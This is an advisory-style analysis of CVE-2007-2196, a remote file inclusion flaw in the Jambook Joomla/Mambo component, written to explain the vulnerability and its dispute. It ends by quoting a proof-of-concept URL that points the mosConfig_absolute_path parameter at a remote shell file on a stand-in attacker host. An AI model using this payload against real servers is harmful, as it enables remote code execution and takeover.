Based on the provided content, here's an analysis of CVE-2007-2196:

**Root Cause of Vulnerability:**
- The reported vulnerability is a Remote File Inclusion (RFI) in the Jambook component for Joomla/Mambo. The vulnerability is claimed to be present due to the usage of `require_once` with a potentially controllable `$mosConfig_absolute_path` variable.

**Weaknesses/Vulnerabilities Present:**
- Remote File Inclusion (RFI): The `require_once` function in `jambook.php` includes a file based on the `$mosConfig_absolute_path` variable, which can potentially be manipulated to point to an attacker-controlled remote file.

**Impact of Exploitation:**
- Arbitrary Code Execution: Successful exploitation allows an attacker to include and execute arbitrary code from a remote server, potentially leading to complete control of the vulnerable server. This could lead to data breaches, malware injection, and other malicious activities.

**Attack Vectors:**
- HTTP GET Request: The attack vector involves manipulating the `mosConfig_absolute_path` parameter in the URL when accessing `jambook.php`.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server.
- The attacker needs to be able to host a malicious PHP file on a server they control.

**Additional Details:**
- The provided information states that the vulnerability is present in Jambook version v1.0 beta7.
- The vulnerability is referenced in Bugtraq ID 23509.
- The report is disputed by George A. Theall who states that the file cannot be called directly because of the code at the top of the file. However, the proof of concept provided by the reporter appears to indicate the vulnerability is valid.

```
require_once("$mosConfig_absolute_path/components/$option/jambook.common.php");
http://site.com/[path]/components/com_Jambook/jambook.php?mosConfig_abso
lute_path=http://shell.com/shell.txt?
```
- The exploit code provided shows the attacker is setting `mosConfig_absolute_path` to point to a remote shell.
